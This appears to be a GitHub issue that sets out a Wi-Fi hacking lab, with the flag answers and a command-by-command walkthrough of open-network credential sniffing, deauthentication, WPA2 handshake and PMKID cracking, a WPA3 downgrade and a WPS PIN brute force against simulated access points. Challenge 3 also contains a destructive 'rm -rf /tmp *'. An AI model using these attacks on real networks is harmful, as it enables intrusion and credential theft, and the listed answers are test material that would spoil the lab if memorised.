### Machine Name

WiFu

### Release Date

_No response_

### Description

# Use Wireless Card 14 for monitor mode (the others are being used for different types of attacks)

Username and Password

```
kali
kali
```

Kali has sudo rights so sudo su to become root

Got into the /root/wifi folder 

```
bash wifi-laballinone.sh
```

```
bash clients.sh
```

Make sure when you put wireless card 14 into monitor mode that you check it, I have seen it where it does not have the mon at the end

Lab is now ready to use

If you want to do the rouge AP, which is not needed to complete this lab, you can use WiFi card 17, logs for rogue AP can be found in ~/wifi-lab/lab.log file under 

### End Description

```
# Set monitor mode
ip link set wlan14 down
iw dev wlan14 set type monitor
ip link set wlan14 up
ip link set wlan14mon up


# Confirm
iw dev wlan14 info | grep type
iw dev wlan14mon info | grep type
# Expected: type monitor
```

<img width="810" height="682" alt="Image" src="https://github.com/user-attachments/assets/1447c9e6-0ad9-438a-84ef-a6e86562edda" />

## Challenge 1:

Observe requests throughout an open network. You can obtain information such as login credentials, credit card data and more.

### Target:
CoffeeShop-FreeWiFi

#### Flag Question:
_None hit done_

Hint 1: 

```
iw dev wlan14 set channel 6

tshark -i wlan14 \
  -Y "http.request" \
  -T fields \
  -e ip.src \
  -e http.host \
  -e http.request.method \
  -e http.request.uri \
  -e http.file_data \
  2>/dev/null
```

## Challenge 2:

### Target:
WPA-PSK-Lab

#### Flag Question:
What is the password found:

wifi@2024

Hint:

```
airodump-ng -c 3 --bssid 02:00:00:00:02:00 -w /tmp/wpa_cap wlan14

WPA_BSSID=$(iw dev wlan2 info | awk '/addr/{print $2}')
WPA_CLIENT=$(iw dev wlan11 info | awk '/addr/{print $2}')

# Send 3 deauth frames — client reconnects within 5 seconds
aireplay-ng -0 3 -a $WPA_BSSID -c $WPA_CLIENT wlan14
```

## Challenge 3:
### Target
ChallengeNet-WPA2

#### Flag Question:
What is the password found:

WPA2SecretKey


## Challenge 4:
### Target
ChallengeNet-WPA2

There is another type of attack that can be done against the ChallengeNet-WPA2 Access Point

**Concept:** Discovered 2018 — the AP includes a PMKID in its first EAPOL
frame. No client or handshake needed. The AP alone provides enough data.

This means we do not need to do a deauth attack against the AP.

#### Flag Question:
_None, user should just hit done_

## Challenge 5:
### Target
SecureNet-WPA3

#### What is the password found:
WPA3TopSecret

## Challenge 6:
### Target
Airport-WPS

When doing this you must start wps-proxy.py which is within the /root/wifi folder 

### What is the pin found:
12345670

### What is the password found:
Airport-WPS

## Challenge 7:
### Target
Hidden Network <length:  0>

### What is the hidden network name
HiddenLabNet


# Walkthrough

```
# Set monitor mode
ip link set wlan14 down
iw dev wlan14 set type monitor
ip link set wlan14 up

# Confirm
iw dev wlan14 info | grep type
# Expected: type monitor
```

## Challenge 1

```
iw dev wlan14mon set channel 6

tshark -i wlan14mon \
  -Y "http.request" \
  -T fields \
  -e ip.src \
  -e http.host \
  -e http.request.method \
  -e http.request.uri \
  -e http.file_data \
  2>/dev/null
```

<img width="1247" height="421" alt="Image" src="https://github.com/user-attachments/assets/990f90ce-8340-40b5-9530-59ac1035c3f2" />

## Challenge 2

```
airodump-ng wlan14mon -c 3 --bssid 02:00:00:00:02:00 -w /tmp/wpa_cap
```

```
aireplay-ng -0 3 -a 02:00:00:00:02:00 -c 02:00:00:00:0B:00 --deauth-rc 4 wlan14mon
```

```
aircrack-ng /tmp/wpa_cap-01.cap -w ~/wifi-lab/wordlist.txt
```

<img width="774" height="1127" alt="Image" src="https://github.com/user-attachments/assets/fd1f131b-f068-4d66-a025-3f2fa8a9d7b5" />


## Challenge 3

```
rm -rf /tmp *
airodump-ng wlan14mon -c 11 --bssid 02:00:00:00:03:00 -w /tmp/wpa2_cap
```

```
aireplay-ng -0 3 -a 02:00:00:00:03:00 -c 02:00:00:00:0C:00 --deauth-rc 4 wlan14mon
```

```
aircrack-ng /tmp/wpa2_cap-01.cap -w ~/wifi-lab/wordlist.txt
```

<img width="796" height="1147" alt="Image" src="https://github.com/user-attachments/assets/f9c63085-ac9a-4d42-a744-d1582fbe4ac6" />

## Challenge 4

```
airodump-ng wlan14mon -c 11 --bssid 02:00:00:00:03:00 -w /tmp/wpa2_cap
```

give this a few minutes, and you will see EAPOL in notes

Now you can go straight to aircrack without ever doing a replay:

```
aircrack-ng /tmp/wpa2_cap-02.cap -w ~/wifi-lab/wordlist.txt
```

<img width="788" height="1097" alt="Image" src="https://github.com/user-attachments/assets/dac3d472-e85b-4b96-9e65-b418fb7de28b" />

## Challenge 5

WPA3 can be hacked if a client connects through WPA2. This is by default incorporated into WPA3 APs to allow for legacy devices. This means we need to deauthenticate the AP and the Client, thus allowing us to grab the handshake (downgrade attack).

```
airodump-ng wlan14 -c 9 -w /tmp/wpa3_cap
```

<img width="690" height="266" alt="Image" src="https://github.com/user-attachments/assets/2e1cf105-4ee8-4c43-9d58-363b76b2af55" />

```
aireplay-ng -0 0 -a 02:00:00:00:04:00 wlan14 -c 02:00:00:00:0D:00
```

You will see a bunch of lost frames, this is a good sign that we are conducting an attack against a WPA2 machine and we have essentially caused a "downgrade" to the AP for that client.

```
aircrack-ng /tmp/wpa3_cap-01.cap -w ~/wifi-lab/wordlist.txt
```

<img width="570" height="639" alt="Image" src="https://github.com/user-attachments/assets/318901db-24cf-4bf9-820f-5185641b2e6a" />

## Challenge 6
```
python3 wps-proxy.py
```

```
reaver -i wlan14 -b 02:00:00:00:07:00 -c 10 -vv -N -S -t 15 -d 2
```

<img width="849" height="624" alt="Image" src="https://github.com/user-attachments/assets/928a4641-414c-4aaf-a01b-bf44e1c7876a" />

## Challenge 7

```
airodump-ng wlan14 --channel 7
```

We can see there is one client connected, kick them off to retrieve the network name.

```
aireplay-ng -0 0 -a 02:00:00:00:06:00 -c 02:00:00:00:0D:00 wlan14
```

<img width="757" height="387" alt="Image" src="https://github.com/user-attachments/assets/5bca1822-20bc-4d1b-8cac-e24859797340" />





### Author

Ryan Yager
